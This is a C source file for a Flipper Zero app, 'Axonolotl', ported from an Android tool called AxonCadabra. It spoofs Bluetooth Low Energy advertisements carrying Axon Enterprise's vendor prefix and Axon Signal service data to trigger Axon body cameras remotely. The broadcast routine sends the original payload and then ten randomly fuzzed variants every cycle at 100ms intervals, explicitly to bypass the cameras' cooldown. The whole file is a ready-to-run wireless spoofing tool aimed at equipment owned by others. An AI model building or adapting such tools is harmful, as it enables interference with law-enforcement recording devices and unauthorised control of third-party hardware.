/*
 * Axonolotl - Flipper Zero Port of AxonCadabra
 * 
 * Original: https://github.com/WithLoveFromMinneapolis/AxonCadabra
 *           by withlovefromminneapolis
 * 
 * Flipper Zero port by infocyte
 * Source: app/src/main/java/com/axon/blecontroller/MainActivity.kt
 * 
 * This tool broadcasts BLE advertisements using the Axon Signal protocol
 * to trigger Axon body cameras via Bluetooth Low Energy.
 * 
 * Broadcast pattern:
 *   - Send original payload
 *   - Send 10 fuzzed payloads (to bypass cooldown)
 *   - Repeat
 * 
 * Each transmission uses the Axon OUI (00:25:DF) as MAC prefix
 * with randomized lower 3 bytes for each broadcast.
 */

#include "axonolotl.h"
#include <furi_hal_random.h>

// Forward declarations for scene handlers
void axonolotl_scene_menu_on_enter(void* context);
bool axonolotl_scene_menu_on_event(void* context, SceneManagerEvent event);
void axonolotl_scene_menu_on_exit(void* context);

void axonolotl_scene_broadcast_on_enter(void* context);
bool axonolotl_scene_broadcast_on_event(void* context, SceneManagerEvent event);
void axonolotl_scene_broadcast_on_exit(void* context);

void axonolotl_scene_about_on_enter(void* context);
bool axonolotl_scene_about_on_event(void* context, SceneManagerEvent event);
void axonolotl_scene_about_on_exit(void* context);

// Scene handlers table
void (*const axonolotl_scene_on_enter_handlers[])(void*) = {
    axonolotl_scene_menu_on_enter,
    axonolotl_scene_broadcast_on_enter,
    axonolotl_scene_about_on_enter,
};

bool (*const axonolotl_scene_on_event_handlers[])(void*, SceneManagerEvent) = {
    axonolotl_scene_menu_on_event,
    axonolotl_scene_broadcast_on_event,
    axonolotl_scene_about_on_event,
};

void (*const axonolotl_scene_on_exit_handlers[])(void*) = {
    axonolotl_scene_menu_on_exit,
    axonolotl_scene_broadcast_on_exit,
    axonolotl_scene_about_on_exit,
};

static const SceneManagerHandlers axonolotl_scene_handlers = {
    .on_enter_handlers = axonolotl_scene_on_enter_handlers,
    .on_event_handlers = axonolotl_scene_on_event_handlers,
    .on_exit_handlers = axonolotl_scene_on_exit_handlers,
    .scene_num = AxonolotlSceneCount,
};

// View dispatcher callbacks
static bool axonolotl_custom_callback(void* context, uint32_t event) {
    furi_assert(context);
    Axonolotl* app = context;
    return scene_manager_handle_custom_event(app->scene_manager, event);
}

static bool axonolotl_back_callback(void* context) {
    furi_assert(context);
    Axonolotl* app = context;
    return scene_manager_handle_back_event(app->scene_manager);
}

/*
 * Prepare the original (unfuzzed) payload
 */
void axonolotl_prepare_original_payload(Axonolotl* app) {
    furi_assert(app);
    memcpy(app->current_data, AXON_BASE_SERVICE_DATA, AXON_SERVICE_DATA_LEN);
    app->current_fuzz_value = 0;
}

/*
 * Prepare a fuzzed payload with random fuzz value
 * 
 * From MainActivity.kt lines 303-321:
 * Uses random fuzz value instead of sequential increment
 * to maximize variation in cooldown bypass attempts.
 */
void axonolotl_prepare_fuzzed_payload(Axonolotl* app) {
    furi_assert(app);
    
    // Start with base data
    memcpy(app->current_data, AXON_BASE_SERVICE_DATA, AXON_SERVICE_DATA_LEN);
    
    // Generate random 16-bit fuzz value
    uint8_t rand_bytes[2];
    furi_hal_random_fill_buf(rand_bytes, 2);
    app->current_fuzz_value = (rand_bytes[0] << 8) | rand_bytes[1];
    
    // Apply fuzz mutations exactly as in original source
    app->current_data[FUZZ_BYTE_10] = (app->current_fuzz_value >> 8) & 0xFF;
    app->current_data[FUZZ_BYTE_11] = app->current_fuzz_value & 0xFF;
    app->current_data[FUZZ_BYTE_20] = (app->current_fuzz_value >> 4) & 0xFF;
    app->current_data[FUZZ_BYTE_21] = (app->current_fuzz_value << 4) & 0xFF;
}

/*
 * Send a single BLE broadcast
 * 
 * Each call:
 * - Generates a new random MAC address with Axon OUI prefix (00:25:DF)
 * - Configures and starts the beacon
 * - Returns true on success
 * 
 * MAC address format:
 *   Bytes 0-2: Axon OUI (00:25:DF) - identifies as Axon device
 *   Bytes 3-5: Random - new for each transmission
 */
bool axonolotl_send_single_broadcast(Axonolotl* app) {
    furi_assert(app);
    
    // Stop any existing beacon first
    furi_hal_bt_extra_beacon_stop();
    
    // Configure beacon with new random MAC (Axon OUI prefix)
    GapExtraBeaconConfig config = {
        .min_adv_interval_ms = 50,
        .max_adv_interval_ms = 50,
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = GapAdvPowerLevel_6dBm,
        .address_type = GapAddressTypeRandom,
    };
    
    /*
     * Generate MAC address with Axon OUI prefix
     * 
     * OUI: 00:25:DF (Axon Enterprise, Inc.)
     * Verified from:
     *   - MainActivity.kt line 38: TARGET_OUI = "00:25:DF"
     *   - IEEE OUI registry lookup
     * 
     * For BLE random addresses, the two MSBs of byte 0 indicate the type:
     *   11 = Static random address
     *   01 = Resolvable private address  
     *   00 = Non-resolvable private address
     * 
     * Axon OUI byte 0 is 0x00, which has MSBs = 00 (non-resolvable private).
     * This is acceptable for our use case.
     */
    config.address[0] = AXON_OUI_BYTE0;  // 0x00
    config.address[1] = AXON_OUI_BYTE1;  // 0x25
    config.address[2] = AXON_OUI_BYTE2;  // 0xDF
    
    // Randomize lower 3 bytes
    furi_hal_random_fill_buf(&config.address[3], 3);
    
    if(!furi_hal_bt_extra_beacon_set_config(&config)) {
        FURI_LOG_E(TAG, "Failed to set beacon config");
        return false;
    }
    
    /*
     * Build advertisement packet with Service Data
     * 
     * BLE AD Structure format:
     * [Length] [Type] [Data...]
     * 
     * Service Data - 16 bit UUID (Type 0x16):
     * [Length] [0x16] [UUID_Lo] [UUID_Hi] [Service Data...]
     */
    uint8_t adv_data[31];
    uint8_t pos = 0;
    
    // Service Data AD structure
    uint8_t svc_data_len = 1 + 2 + AXON_SERVICE_DATA_LEN;  // type + uuid + data
    adv_data[pos++] = svc_data_len;
    adv_data[pos++] = 0x16;  // Service Data - 16 bit UUID
    adv_data[pos++] = AXON_SERVICE_UUID_16 & 0xFF;         // UUID low byte (0x6C)
    adv_data[pos++] = (AXON_SERVICE_UUID_16 >> 8) & 0xFF;  // UUID high byte (0xFE)
    memcpy(&adv_data[pos], app->current_data, AXON_SERVICE_DATA_LEN);
    pos += AXON_SERVICE_DATA_LEN;
    
    if(!furi_hal_bt_extra_beacon_set_data(adv_data, pos)) {
        FURI_LOG_E(TAG, "Failed to set beacon data");
        return false;
    }
    
    if(!furi_hal_bt_extra_beacon_start()) {
        FURI_LOG_E(TAG, "Failed to start beacon");
        return false;
    }
    
    app->total_transmissions++;
    
    FURI_LOG_D(TAG, "TX #%lu: MAC=%02X:%02X:%02X:%02X:%02X:%02X Fuzz=0x%04X",
        app->total_transmissions,
        config.address[0], config.address[1], config.address[2],
        config.address[3], config.address[4], config.address[5],
        app->current_fuzz_value);
    
    return true;
}

void axonolotl_stop_broadcasting(Axonolotl* app) {
    furi_assert(app);
    
    if(app->is_broadcasting) {
        furi_timer_stop(app->broadcast_timer);
        furi_hal_bt_extra_beacon_stop();
        app->is_broadcasting = false;
        FURI_LOG_I(TAG, "Broadcast stopped after %lu transmissions", app->total_transmissions);
    }
}

/*
 * Broadcast timer callback - called every BROADCAST_INTERVAL_MS (100ms)
 * 
 * Pattern:
 *   cycle_position 0: Send original payload
 *   cycle_position 1-10: Send fuzzed payloads
 *   Then reset to 0 and repeat
 */
static void axonolotl_broadcast_timer_callback(void* context) {
    Axonolotl* app = context;
    
    // Prepare payload based on cycle position
    if(app->cycle_position == 0) {
        axonolotl_prepare_original_payload(app);
    } else {
        axonolotl_prepare_fuzzed_payload(app);
    }
    
    // Send the broadcast
    axonolotl_send_single_broadcast(app);
    
    // Advance cycle position
    app->cycle_position++;
    if(app->cycle_position > FUZZ_COUNT_PER_CYCLE) {
        app->cycle_position = 0;  // Reset to original payload
    }
    
    // Trigger UI update
    view_dispatcher_send_custom_event(app->view_dispatcher, AxonolotlEventBroadcastTick);
}

// ============================================================================
// Scene: Menu
// ============================================================================

typedef enum {
    MenuIndexBroadcast,
    MenuIndexAbout,
} MenuIndex;

static void axonolotl_menu_callback(void* context, uint32_t index) {
    Axonolotl* app = context;
    switch(index) {
        case MenuIndexBroadcast:
            scene_manager_next_scene(app->scene_manager, AxonolotlSceneBroadcast);
            break;
        case MenuIndexAbout:
            scene_manager_next_scene(app->scene_manager, AxonolotlSceneAbout);
            break;
    }
}

void axonolotl_scene_menu_on_enter(void* context) {
    Axonolotl* app = context;
    
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Axonolotl");
    submenu_add_item(app->submenu, "Broadcast", MenuIndexBroadcast, axonolotl_menu_callback, app);
    submenu_add_item(app->submenu, "About", MenuIndexAbout, axonolotl_menu_callback, app);
    
    view_dispatcher_switch_to_view(app->view_dispatcher, AxonolotlViewSubmenu);
}

bool axonolotl_scene_menu_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void axonolotl_scene_menu_on_exit(void* context) {
    Axonolotl* app = context;
    submenu_reset(app->submenu);
}

// ============================================================================
// Scene: Broadcast (unified trigger + fuzz mode)
// ============================================================================

static void axonolotl_update_broadcast_display(Axonolotl* app) {
    static char text[96];
    const char* mode = (app->cycle_position == 0) ? "ORIGINAL" : "FUZZED";
    snprintf(text, sizeof(text), 
        "TX: %lu\n"
        "Mode: %s\n"
        "Fuzz: 0x%04X\n"
        "Press Back to stop", 
        app->total_transmissions,
        mode,
        app->current_fuzz_value);
    popup_set_text(app->popup, text, 64, 20, AlignCenter, AlignTop);
}

void axonolotl_scene_broadcast_on_enter(void* context) {
    Axonolotl* app = context;
    
    // Initialize broadcast state
    app->cycle_position = 0;
    app->total_transmissions = 0;
    app->current_fuzz_value = 0;
    app->is_broadcasting = true;
    
    // Prepare and send first (original) payload immediately
    axonolotl_prepare_original_payload(app);
    
    if(axonolotl_send_single_broadcast(app)) {
        popup_set_header(app->popup, "BROADCASTING", 64, 4, AlignCenter, AlignTop);
        axonolotl_update_broadcast_display(app);
        
        // Advance to first fuzz position for next tick
        app->cycle_position = 1;
        
        // Start timer for subsequent broadcasts (100ms interval)
        furi_timer_start(app->broadcast_timer, furi_ms_to_ticks(BROADCAST_INTERVAL_MS));
        
        // Green LED while broadcasting
        notification_message(app->notifications, &sequence_set_only_green_255);
    } else {
        popup_set_header(app->popup, "TX FAILED", 64, 8, AlignCenter, AlignTop);
        popup_set_text(app->popup, "Could not start\nBLE advertising", 64, 26, AlignCenter, AlignTop);
        notification_message(app->notifications, &sequence_set_only_red_255);
        app->is_broadcasting = false;
    }
    
    view_dispatcher_switch_to_view(app->view_dispatcher, AxonolotlViewPopup);
}

bool axonolotl_scene_broadcast_on_event(void* context, SceneManagerEvent event) {
    Axonolotl* app = context;
    
    if(event.type == SceneManagerEventTypeCustom && event.event == AxonolotlEventBroadcastTick) {
        axonolotl_update_broadcast_display(app);
        return true;
    }
    return false;
}

void axonolotl_scene_broadcast_on_exit(void* context) {
    Axonolotl* app = context;
    
    axonolotl_stop_broadcasting(app);
    notification_message(app->notifications, &sequence_reset_rgb);
    popup_reset(app->popup);
}

// ============================================================================
// Scene: About
// ============================================================================

void axonolotl_scene_about_on_enter(void* context) {
    Axonolotl* app = context;
    
    widget_reset(app->widget);
    
    // Add title using string element (bold, centered)
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Axonolotl");
    
    // Add scrollable text area below title
    // Format: \ec = center align, \e# = bold
    widget_add_text_scroll_element(
        app->widget, 0, 16, 128, 48,
        "\ecAxonCadabra Port\n"
        "\ecfor Flipper Zero\n"
        "\ecv1.1\n"
        "\n"
        "\e#Original:\n"
        "withlovefromminneapolis\n"
        "github.com/WithLove\n"
        "FromMinneapolis/\n"
        "AxonCadabra\n"
        "\n"
        "\e#Flipper Zero port:\n"
        "infocyte\n");
    
    view_dispatcher_switch_to_view(app->view_dispatcher, AxonolotlViewWidget);
}

bool axonolotl_scene_about_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void axonolotl_scene_about_on_exit(void* context) {
    Axonolotl* app = context;
    widget_reset(app->widget);
}

// ============================================================================
// Application lifecycle
// ============================================================================

Axonolotl* axonolotl_alloc(void) {
    Axonolotl* app = malloc(sizeof(Axonolotl));
    
    // Initialize state
    app->is_broadcasting = false;
    app->cycle_position = 0;
    app->total_transmissions = 0;
    app->current_fuzz_value = 0;
    memcpy(app->current_data, AXON_BASE_SERVICE_DATA, AXON_SERVICE_DATA_LEN);
    
    // Open services
    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    
    // Create view dispatcher (queue is always enabled in current API)
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, axonolotl_custom_callback);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, axonolotl_back_callback);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    
    // Create scene manager
    app->scene_manager = scene_manager_alloc(&axonolotl_scene_handlers, app);
    
    // Create views
    app->submenu = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, AxonolotlViewSubmenu, submenu_get_view(app->submenu));
    
    app->popup = popup_alloc();
    view_dispatcher_add_view(app->view_dispatcher, AxonolotlViewPopup, popup_get_view(app->popup));
    
    app->widget = widget_alloc();
    view_dispatcher_add_view(app->view_dispatcher, AxonolotlViewWidget, widget_get_view(app->widget));
    
    // Create broadcast timer
    app->broadcast_timer = furi_timer_alloc(axonolotl_broadcast_timer_callback, FuriTimerTypePeriodic, app);
    
    return app;
}

void axonolotl_free(Axonolotl* app) {
    furi_assert(app);
    
    // Stop operations
    furi_timer_stop(app->broadcast_timer);
    furi_hal_bt_extra_beacon_stop();
    
    // Free timer
    furi_timer_free(app->broadcast_timer);
    
    // Remove and free views
    view_dispatcher_remove_view(app->view_dispatcher, AxonolotlViewSubmenu);
    submenu_free(app->submenu);
    
    view_dispatcher_remove_view(app->view_dispatcher, AxonolotlViewPopup);
    popup_free(app->popup);
    
    view_dispatcher_remove_view(app->view_dispatcher, AxonolotlViewWidget);
    widget_free(app->widget);
    
    // Free scene manager and view dispatcher
    scene_manager_free(app->scene_manager);
    view_dispatcher_free(app->view_dispatcher);
    
    // Close services
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    
    free(app);
}

int32_t axonolotl_app(void* p) {
    UNUSED(p);
    
    Axonolotl* app = axonolotl_alloc();
    
    scene_manager_next_scene(app->scene_manager, AxonolotlSceneMenu);
    view_dispatcher_run(app->view_dispatcher);
    
    axonolotl_free(app);
    return 0;
}
